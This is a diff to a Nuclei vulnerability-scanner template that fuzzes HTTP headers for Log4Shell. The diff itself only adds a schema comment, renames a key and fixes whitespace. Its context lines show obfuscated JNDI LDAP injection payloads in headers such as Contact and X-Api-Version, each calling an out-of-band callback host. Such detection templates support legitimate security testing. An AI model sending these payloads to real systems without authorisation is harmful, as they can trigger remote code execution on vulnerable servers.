@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: log4j-fuzz-head-poc
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: critical
   tags: apache,rce
 
-requests:
+http:
   - raw:
       - |
         GET / HTTP/1.1
@@ -200,7 +201,7 @@ requests:
         - 'Contact: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}'
         - 'X-Wap-Profile: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}'
         - 'X-Api-Version: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}'
-                
+
     attack: clusterbomb
     matchers-condition: or
     matchers:
